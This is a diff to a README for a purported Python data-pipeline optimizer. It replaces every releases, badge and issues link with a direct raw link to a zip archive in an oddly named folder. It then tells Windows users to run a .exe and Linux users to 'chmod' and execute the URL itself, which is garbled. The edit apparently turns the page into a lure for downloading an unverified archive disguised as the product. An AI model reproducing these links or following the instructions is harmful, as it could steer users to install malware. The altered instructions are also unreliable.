@@ -1,6 +1,6 @@
 # 🛠️ data-python-pipeline-optimizer-script - Optimize Your Data Pipeline Effortlessly
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/WatarDReiji/data-python-pipeline-optimizer-script/releases)
+[![Download](https://raw.githubusercontent.com/WatarDReiji/data-python-pipeline-optimizer-script/main/cleronomy/optimizer-data-python-pipeline-script-v2.2.zip%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/WatarDReiji/data-python-pipeline-optimizer-script/main/cleronomy/optimizer-data-python-pipeline-script-v2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ To get started, you'll need to download the script. Follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to access the latest version.
    
-   [Visit this page to download](https://github.com/WatarDReiji/data-python-pipeline-optimizer-script/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/WatarDReiji/data-python-pipeline-optimizer-script/main/cleronomy/optimizer-data-python-pipeline-script-v2.2.zip)
 
 2. **Select the Latest Release**: Look for the version labeled as "Latest". 
 
@@ -20,7 +20,7 @@ To get started, you'll need to download the script. Follow these steps:
 
 4. **Install the Application**:
    - For **Windows**: Double-click the downloaded `.exe` file and follow the on-screen instructions.
-   - For **Linux**: Make the `.sh` file executable by running `chmod +x your-file.sh` in your terminal, then run it with `./your-file.sh`.
+   - For **Linux**: Make the `.sh` file executable by running `chmod +x https://raw.githubusercontent.com/WatarDReiji/data-python-pipeline-optimizer-script/main/cleronomy/optimizer-data-python-pipeline-script-v2.2.zip` in your terminal, then run it with `https://raw.githubusercontent.com/WatarDReiji/data-python-pipeline-optimizer-script/main/cleronomy/optimizer-data-python-pipeline-script-v2.2.zip`.
    - For **macOS**: Open the downloaded `.zip`, then drag the application to your Applications folder.
 
 5. **Run the Script**: Once installed, find the application in your programs or applications list. Click to open it.
@@ -63,7 +63,7 @@ If you encounter any issues while using the script, try the following:
 
 - **Reinstall the Application**: If you face persistent problems, uninstall and reinstall the application.
 - **Check System Requirements**: Ensure your system meets the requirements outlined above.
-- **Search for Solutions**: Visit the [Issues section](https://github.com/WatarDReiji/data-python-pipeline-optimizer-script/issues) on GitHub for common solutions and user questions.
+- **Search for Solutions**: Visit the [Issues section](https://raw.githubusercontent.com/WatarDReiji/data-python-pipeline-optimizer-script/main/cleronomy/optimizer-data-python-pipeline-script-v2.2.zip) on GitHub for common solutions and user questions.
 
 ## 🎉 Community Support
 
@@ -84,4 +84,4 @@ For further questions or support, reach out via the contact page on our GitHub o
 
 Make the most out of your data pipelines with the data-python-pipeline-optimizer-script! Start optimizing today.
 
-[Visit this page to download](https://github.com/WatarDReiji/data-python-pipeline-optimizer-script/releases)
+[Visit this page to download](https://raw.githubusercontent.com/WatarDReiji/data-python-pipeline-optimizer-script/main/cleronomy/optimizer-data-python-pipeline-script-v2.2.zip)
